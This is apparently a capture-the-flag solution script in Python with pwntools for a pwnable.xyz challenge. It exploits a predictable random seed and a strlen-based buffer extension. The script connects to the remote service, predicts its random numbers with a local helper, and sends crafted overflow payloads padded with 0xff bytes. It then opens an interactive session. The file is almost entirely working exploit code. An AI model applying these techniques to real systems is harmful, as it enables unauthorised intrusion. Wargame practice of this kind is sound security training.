###Predictable random seed and strlen extend buffer

from pwn import *
import subprocess

###Util
def win(idx):
    while randnum[idx]==0xffffffff:
        r.sendlineafter('pawa> ',str(0xffffffff))
        r.sendafter('[N/y]','N')
        idx+=1
    r.sendlineafter('pawa> ',str(0xffffffff))
    return idx+1

def tie(idx,data):
    r.sendlineafter('pawa> ',str(randnum[idx]))
    r.sendafter('[N/y]','y')
    r.sendafter('Name: ',data)
    return idx+1

def lose(idx):
    while randnum[idx]==0:
        r.sendlineafter('pawa> ','0')
        r.sendafter('[N/y]','N')
        idx+=1
    r.sendlineafter('pawa> ','0')

###Exploit
r = remote('svc.pwnable.xyz',30024)
r.sendlineafter('[Y/n] : ','y')
r.sendafter('Name: ','a'*0x2c)
r.sendlineafter('> ','5')

randnum = list(map(int,subprocess.getoutput('./genrand').strip().split('\n')))
cnt = 0
for i in range(1,9):
    for j in range(1,pow(2,max(i-2,0))):
        print(i,j)
        cnt = win(cnt)
        ###Rather interesting here
        ###Thw /xff needed to be padded at end is equal to number of disk to be moved at n-th step of optimal solution to Towers of Hanoi
        ###In laymans terms, it would be 1,2,1,3,1,2,1,4...
        ###This can then be formulated to the number of digits that must be counted from right to left to reach the first 1 in the binary representation of n
        ###Thus, taking bin(j) and stripping 0 takes away all the '0' on right and '0' of 0x from left
        ###Which equals the desired digit count
        cnt = tie(cnt,b'a'*0x2c+b'\xff'*(len(bin(j))-len(bin(j).strip('0'))))
        cnt = win(cnt)
    cnt = win(cnt)
    if i!=8:
        cnt = tie(cnt,b'a'*0x2c+b'\xff'*i)
        cnt = win(cnt)

lose(cnt)
r.interactive()
